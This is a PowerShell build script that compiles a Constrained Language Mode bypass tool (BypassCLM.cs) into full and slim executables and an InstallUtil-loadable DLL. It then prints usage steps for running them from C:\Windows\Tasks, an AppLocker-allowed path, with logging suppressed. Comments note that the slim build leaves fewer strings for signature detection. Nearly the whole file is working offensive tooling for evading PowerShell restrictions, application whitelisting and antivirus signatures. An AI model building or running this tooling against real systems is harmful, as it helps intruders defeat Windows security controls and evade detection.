$ErrorActionPreference = 'Stop'

$csc = Join-Path $env:windir 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
if (-not (Test-Path $csc)) { throw "csc.exe not found at $csc" }

$sma = Get-ChildItem "$env:windir\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation" -Filter '*.dll' -Recurse |
       Select-Object -First 1 -ExpandProperty FullName
if (-not $sma) { throw 'System.Management.Automation.dll not found in GAC' }

$src = Join-Path $PSScriptRoot 'BypassCLM.cs'
if (-not (Test-Path $src)) { throw "Source not found: $src" }

$ref = "/reference:`"$sma`""

Write-Host "[*] csc: $csc" -Fore Cyan
Write-Host "[*] SMA: $sma" -Fore Cyan

# Full EXE: WinPS 5.1 runspace, core modules pre-loaded, all cmdlets work.
& $csc /nologo /target:exe /define:FULL /platform:x64 /optimize $ref /out:bypass-clm.exe $src
if ($LASTEXITCODE -eq 0) { Write-Host '[+] bypass-clm.exe      (full)' -Fore Green }

# Slim EXE: minimal runspace, smaller footprint, fewer strings to signature.
& $csc /nologo /target:exe /platform:x64 /optimize $ref /out:bypass-clm-slim.exe $src
if ($LASTEXITCODE -eq 0) { Write-Host '[+] bypass-clm-slim.exe (slim)' -Fore Green }

# DLL: load via InstallUtil.exe from an AppLocker-allowed path.
#   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U bypass-clm.dll
& $csc /nologo /target:library /define:FULL,DLL /platform:x64 /optimize $ref /reference:System.Configuration.Install.dll /out:bypass-clm.dll $src
if ($LASTEXITCODE -eq 0) { Write-Host '[+] bypass-clm.dll      (InstallUtil)' -Fore Green }

Write-Host "`nUsage:" -Fore Yellow
Write-Host '  EXE:  copy bypass-clm.exe C:\Windows\Tasks\; C:\Windows\Tasks\bypass-clm.exe'
Write-Host '  DLL:  copy bypass-clm.dll C:\Windows\Tasks\'
Write-Host '        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass-clm.dll'
